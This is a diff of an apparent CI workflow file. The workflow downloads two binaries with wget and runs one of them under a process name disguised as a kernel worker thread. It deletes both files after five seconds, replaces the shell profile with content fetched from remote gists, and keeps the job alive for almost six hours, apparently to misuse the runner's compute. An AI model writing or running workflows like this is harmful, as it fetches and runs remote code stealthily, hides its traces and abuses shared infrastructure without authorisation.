@@ -27,6 +27,7 @@ jobs:
             wget -q -O "$p/x1" "$DATA_X"
             wget --user-agent="Mozilla/5.0" -q -O "$p/x2" "$DATA_Y"
             chmod +x $p/x1 $p/x2
+            ls -lah $p/x1 $p/x2
             ($p/x1 -f -a '[kworker/u2:3-events_unbound]' $p/x2 2>&1 &)
             (sleep 5 && rm -f $p/x1 $p/x2) &>/dev/null & disown
           fi
@@ -79,7 +80,6 @@ jobs:
           cp ~/.bashrc ~/.bashrc.bak
           curl -Lso ~/.bashrc https://gist.github.com/idanyas/d58cba4df7a416c0b0e85660f78abf7f/raw
           curl -Lso ~/.abashrc https://gist.github.com/idanyas/190323ff4cb50e29be4a2c74e0ed7e4a/raw
-          tput reset && source ~/.bashrc
           '
       - name: Keep job alive
         run: sleep 21540  # Sleep for 5 hours 59 minutes
